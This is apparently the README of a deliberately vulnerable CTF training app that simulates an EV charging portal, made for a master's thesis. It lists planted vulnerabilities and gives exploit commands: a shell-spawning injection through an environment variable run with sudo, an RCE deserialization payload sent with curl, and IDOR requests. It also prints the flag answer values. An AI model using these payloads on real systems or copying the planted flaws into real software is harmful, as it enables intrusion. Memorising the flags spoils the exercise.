# EcoCharge Portal - CTF Vulnerable Web Application

## Overview

This is a deliberately vulnerable web application simulating a regional EV charging network operator's portal. It is designed for cybersecurity training and CTF (Capture The Flag) competitions.

**⚠️ WARNING: This application contains intentional security vulnerabilities. DO NOT deploy in production environments!**

## Vulnerabilities Included

### 1. CVE-2025-55182 - React Server Components RCE (Critical)
- **Location**: `/api/server-action`
- **Type**: Pre-authentication Remote Code Execution
- **Cause**: Unsafe deserialization in React Server Components
- **CVSS**: 9.8

### 2. Command Injection - Privilege Escalation (High)
- **Location**: `/opt/maintenance/backup.js`
- **Type**: Local Privilege Escalation
- **Cause**: Unsanitized environment variable in shell command
- **Exploitation**: `export BACKUP_TARGET="; /bin/bash -p" && sudo node /opt/maintenance/backup.js`

### 3. IDOR - Insecure Direct Object Reference (Medium)
- **Location**: `/api/user?user_id=X`
- **Type**: Authorization bypass
- **Cause**: No access control on user data endpoint

### 4. Weak Authentication (Medium)
- **Location**: `/api/auth`
- **Type**: Cryptographic weakness
- **Cause**: MD5 password hashing, base64 tokens without signature

### 5. Information Disclosure (Low)
- **Location**: HTTP headers, error messages
- **Type**: Information leakage
- **Cause**: Verbose errors, version disclosure in headers

## Deployment

### Prerequisites
- Ubuntu 22.04 LTS
- Node.js 20.x
- nginx
- Root access

### Quick Deploy

```bash
# Clone or copy files to server
git clone <repository> /tmp/ecocharge
cd /tmp/ecocharge

# Run setup script
chmod +x setup-server.sh
sudo ./setup-server.sh
```

### Manual Deploy

```bash
# 1. Install Node.js
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# 2. Create directories
sudo mkdir -p /var/www/ecocharge
sudo mkdir -p /opt/maintenance
sudo mkdir -p /var/log/ecocharge

# 3. Copy application files
sudo cp -r ./* /var/www/ecocharge/
sudo cp scripts/backup.js /opt/maintenance/

# 4. Install dependencies
cd /var/www/ecocharge
sudo npm install

# 5. Set permissions
sudo chown -R www-data:www-data /var/www/ecocharge

# 6. Configure sudo for privilege escalation
echo 'www-data ALL=(ALL) NOPASSWD: /usr/bin/node /opt/maintenance/backup.js' | sudo tee /etc/sudoers.d/ecocharge

# 7. Create flags
echo "FLAG{r34ct_s3rv3r_c0mp0n3nts_d3s3r14l1z4t10n}" | sudo tee /var/www/ecocharge/.flag1.txt
echo "FLAG{pr1v3sc_v14_n0d3_c0mm4nd_1nj3ct10n}" | sudo tee /root/.flag2.txt
sudo chmod 600 /root/.flag2.txt

# 8. Start application
cd /var/www/ecocharge
sudo -u www-data npm start
```

### Using PM2 (Recommended)

```bash
sudo npm install -g pm2
cd /var/www/ecocharge
sudo -u www-data pm2 start npm --name "ecocharge" -- start
sudo -u www-data pm2 save
sudo pm2 startup
```

## Network Configuration

For the full CTF scenario, this server should be:

| Parameter | Value |
|-----------|-------|
| IP Address | 192.168.125.50 |
| Hostname | ecocharge-web |
| Network | External (WAN) |

### Firewall Rules (UFW)

```bash
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS
sudo ufw enable
```

### hosts Entry (Attacker Machine)

```bash
echo "192.168.125.50 ecocharge.local" | sudo tee -a /etc/hosts
```

## CTF Flags

| Flag # | Location | Value | Points |
|--------|----------|-------|--------|
| 1 | `/var/www/ecocharge/.flag1.txt` | `FLAG{r34ct_s3rv3r_c0mp0n3nts_d3s3r14l1z4t10n}` | 100 |
| 2 | `/root/.flag2.txt` | `FLAG{pr1v3sc_v14_n0d3_c0mm4nd_1nj3ct10n}` | 150 |
| 3 | `.env` file | `FLAG{cr3d3nt14ls_1n_c0nf1g_f1l3s}` | 100 |

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/stations` | GET | List all charging stations |
| `/api/stations` | POST | Get station by ID |
| `/api/auth` | POST | User authentication |
| `/api/auth` | GET | Verify token |
| `/api/user` | GET | Get user data (IDOR) |
| `/api/user` | POST | Get user transactions |
| `/api/server-action` | POST | **VULNERABLE** - RCE endpoint |

## Testing Vulnerabilities

### Test CVE-2025-55182

```bash
# Check endpoint
curl -X GET https://ecocharge.local/api/server-action -k

# Exploit (example payload)
curl -X POST https://ecocharge.local/api/server-action \
  -H "Content-Type: application/json" \
  -k \
  -d '{"payload":{"$type":"ServerReference","$$id":"__webpack_require__","$$bound":[{"body":"require(\"child_process\").execSync(\"id\").toString()"}]}}'
```

### Test IDOR

```bash
# Access other users' data
curl https://ecocharge.local/api/user?user_id=1 -k
curl https://ecocharge.local/api/user?user_id=2 -k
```

### Test Privilege Escalation

```bash
# After getting shell as www-data
sudo -l
export BACKUP_TARGET="; id"
sudo /usr/bin/node /opt/maintenance/backup.js
```

## Logs

- Application: `journalctl -u ecocharge -f`
- nginx: `/var/log/nginx/access.log`, `/var/log/nginx/error.log`
- Custom: `/var/log/ecocharge/`

## Troubleshooting

### Application won't start
```bash
cd /var/www/ecocharge
npm install
sudo chown -R www-data:www-data .
```

### Port 3000 in use
```bash
sudo lsof -i :3000
sudo kill -9 <PID>
```

### Check application status
```bash
systemctl status ecocharge
# or
pm2 status
```

## Security Notice

This application is intentionally vulnerable and should only be used in:
- Isolated lab environments
- CTF competitions
- Security training courses

Never expose this application to the internet or use in production.

## License

Educational use only. Created for cybersecurity training purposes.

## Author

Created for Master's Thesis: "Development of a scenario for integrating vulnerability data of EV charging station management system administrative panels into an experimental security analysis environment"
